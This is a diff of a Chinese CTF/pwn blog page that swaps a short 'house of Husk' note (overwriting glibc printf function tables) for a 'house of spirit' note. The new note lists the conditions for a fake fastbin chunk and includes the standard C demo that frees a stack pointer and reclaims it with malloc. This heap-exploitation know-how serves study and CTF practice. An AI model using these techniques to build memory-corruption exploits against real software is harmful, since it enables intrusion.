@@ -11,7 +11,7 @@
   <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
   <link rel="icon" href="/img/fluid.png">
   
-    <link rel="canonical" href="https://yy-t1.github.io/2026/08/11/pwn/pwn基础/house_of系列/house-of-Husk/"/>
+    <link rel="canonical" href="https://yy-t1.github.io/2026/08/12/pwn/pwn基础/house_of/house-of-spirit/"/>
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -21,15 +21,15 @@
   <meta name="author" content="bsahfm">
   <meta name="keywords" content="">
   
-    <meta name="description" content="基础glibc 的 printf 支持自定义格式符 12345678910111213glibc 内部维护了几个表：__printf_function_table__printf_arginfo_table__printf_va_arg_table当程序使用类似：printf(&quot;%!&quot;, ...);而 ! 不是普通格式字符时，glibc 会检查__printf_arginfo_">
+    <meta name="description" content="基础在任意libc版本理论上均可成立 伪造一个fastbin chunk 然后让free()将一个“栈上的指针”当成堆块释放 最后通过malloc()将这块栈内存申请回来 fake_fastbin_chunk条件1.fake chunk地址必须16字节对齐 2.size合法 3.fake chunk 后方必须有可访问且合理的 next chunk size （旧版glibc在fastbin fre">
 <meta property="og:type" content="article">
-<meta property="og:title" content="house_of_Husk">
-<meta property="og:url" content="https://yy-t1.github.io/2026/08/11/pwn/pwn%E5%9F%BA%E7%A1%80/house_of%E7%B3%BB%E5%88%97/house-of-Husk/index.html">
+<meta property="og:title" content="house_of_spirit">
+<meta property="og:url" content="https://yy-t1.github.io/2026/08/12/pwn/pwn%E5%9F%BA%E7%A1%80/house_of/house-of-spirit/index.html">
 <meta property="og:site_name" content="bsahfm">
-<meta property="og:description" content="基础glibc 的 printf 支持自定义格式符 12345678910111213glibc 内部维护了几个表：__printf_function_table__printf_arginfo_table__printf_va_arg_table当程序使用类似：printf(&quot;%!&quot;, ...);而 ! 不是普通格式字符时，glibc 会检查__printf_arginfo_">
+<meta property="og:description" content="基础在任意libc版本理论上均可成立 伪造一个fastbin chunk 然后让free()将一个“栈上的指针”当成堆块释放 最后通过malloc()将这块栈内存申请回来 fake_fastbin_chunk条件1.fake chunk地址必须16字节对齐 2.size合法 3.fake chunk 后方必须有可访问且合理的 next chunk size （旧版glibc在fastbin fre">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-08-11T00:17:15.000Z">
-<meta property="article:modified_time" content="2026-08-11T00:30:34.521Z">
+<meta property="article:published_time" content="2026-08-11T23:37:22.000Z">
+<meta property="article:modified_time" content="2026-08-18T02:07:48.815Z">
 <meta property="article:author" content="bsahfm">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -39,7 +39,7 @@
   
         <meta name="google-site-verification" content="google24f795c42c9493e5.html" />
   
-  <title>house_of_Husk - bsahfm</title>
+  <title>house_of_spirit - bsahfm</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -218,7 +218,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="house_of_Husk"></span>
+            <span id="subtitle" data-typed-text="house_of_spirit"></span>
           
         </div>
 
@@ -229,8 +229,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-08-11 08:17" pubdate>
-          2026年8月11日 早上
+        <time datetime="2026-08-12 07:37" pubdate>
+          2026年8月12日 早上
         </time>
       </span>
     
@@ -241,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          123 字
+          289 字
         
       </span>
     
@@ -252,7 +252,7 @@
         
         
         
-          2 分钟
+          3 分钟
         
       </span>
     
@@ -298,27 +298,22 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">house_of_Husk</h1>
+            <h1 id="seo-header">house_of_spirit</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>glibc 的 printf 支持自定义格式符</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sqf">glibc 内部维护了几个表：<br><span class="hljs-variable">__printf_function_table</span><br><span class="hljs-variable">__printf_arginfo_table</span><br><span class="hljs-variable">__printf_va_arg_table</span><br><br><br>当程序使用类似：<br>printf(<span class="hljs-string">&quot;%!&quot;</span>, ...);<br>而 ! 不是普通格式字符时，glibc 会检查<br><span class="hljs-variable">__printf_arginfo_table</span>[<span class="hljs-string">&#x27;!&#x27;</span>]<br><span class="hljs-variable">__printf_function_table</span>[<span class="hljs-string">&#x27;!&#x27;</span>]<br><br>如果表项非空，那么就把它们当作函数指针调用<br></code></pre></td></tr></table></figure>
+                <h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>在任意libc版本理论上均可成立</p>
+<p>伪造一个fastbin chunk</p>
+<p>然后让free()将一个“栈上的指针”当成堆块释放</p>
+<p>最后通过malloc()将这块栈内存申请回来</p>
+<h3 id="fake-fastbin-chunk条件"><a href="#fake-fastbin-chunk条件" class="headerlink" title="fake_fastbin_chunk条件"></a>fake_fastbin_chunk条件</h3><p>1.fake chunk地址必须16字节对齐</p>
+<p>2.size合法</p>
+<p>3.fake chunk 后方必须有可访问且合理的 next chunk size</p>
+<p>（旧版glibc在fastbin free时可能会检测chunksize(fake + fake_size))</p>
+<h3 id="示例使用"><a href="#示例使用" class="headerlink" title="示例使用"></a>示例使用</h3><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-symbol">#include</span> &lt;stdio.h&gt;<br><span class="hljs-symbol">#include</span> &lt;stdlib.h&gt;<br><br>int main()<br>&#123;<br>	fprintf(stderr, <span class="hljs-comment">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>	malloc(<span class="hljs-number">1</span>);<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>	unsigned long long *a;<br>	// <span class="hljs-type">This</span> has nothing to do with fastbinsY (do not be fooled by the <span class="hljs-number">10</span>) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)<br>	unsigned long long fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, sizeof(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br>	fprintf(stderr, <span class="hljs-comment">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>	fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; // this is the size<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        // fake_chunks[<span class="hljs-number">9</span>] because <span class="hljs-number">0x40</span> / sizeof(unsigned long long) = <span class="hljs-number">8</span><br>	fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; // nextsize<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>	fprintf(stderr, <span class="hljs-comment">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>	a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>	free(a);<br><br>	fprintf(stderr, <span class="hljs-comment">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>	fprintf(stderr, <span class="hljs-comment">&quot;malloc(0x30): %p\n&quot;</span>, malloc(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
-
-<p>所以，如果我们能修改</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__printf_function_table</span><br><span class="hljs-variable">__printf_arginfo_table</span><br></code></pre></td></tr></table></figure>
-
-<p>那么我们就能伪造一个表：</p>
-<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">fake_arginfo_table[<span class="hljs-string">&#x27;!&#x27;</span>]  = 任意地址<span class="hljs-number">1</span><br>fake_function_table[<span class="hljs-string">&#x27;!&#x27;</span>] = 任意地址<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
-
-<p>然后调用</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%!&quot;</span>, argument);<br></code></pre></td></tr></table></figure>
-
-<p>触发这些地址</p>
-<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="Nepctf2026-onlyone"><a href="#Nepctf2026-onlyone" class="headerlink" title="Nepctf2026-onlyone"></a>Nepctf2026-onlyone</h3>
                 
               </div>
             
@@ -346,7 +341,7 @@
   
     <span>></span>
     
-  <a href="/categories/pwn/pwn%E5%9F%BA%E7%A1%80/house-of%E7%B3%BB%E5%88%97/" class="category-chain-item">house_of系列</a>
+  <a href="/categories/pwn/pwn%E5%9F%BA%E7%A1%80/house-of/" class="category-chain-item">house_of</a>
   
   
 
@@ -370,8 +365,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>house_of_Husk</div>
-      <div>https://yy-t1.github.io/2026/08/11/pwn/pwn基础/house_of系列/house-of-Husk/</div>
+      <div>house_of_spirit</div>
+      <div>https://yy-t1.github.io/2026/08/12/pwn/pwn基础/house_of/house-of-spirit/</div>
     </div>
     <div class="license-meta">
       
@@ -383,7 +378,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年8月11日</div>
+          <div>2026年8月12日</div>
         </div>
       
       
@@ -415,9 +410,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/08/12/house-of-botcake/" title="house_of_botcake">
+                      <a href="/2026/08/12/pwn/pwn%E5%9F%BA%E7%A1%80/house_of/house-of-force/" title="house_of_force">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">house_of_botcake</span>
+                        <span class="hidden-mobile">house_of_force</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -425,8 +420,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/08/04/pwn/%E6%AF%94%E8%B5%9B/NepCTF-2026/" title="NepCTF_2026">
-                        <span class="hidden-mobile">NepCTF_2026</span>
+                      <a href="/2026/08/12/pwn/pwn%E5%9F%BA%E7%A1%80/%E5%A0%86/tcache-poisoning/" title="tcache_poisoning">
+                        <span class="hidden-mobile">tcache_poisoning</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
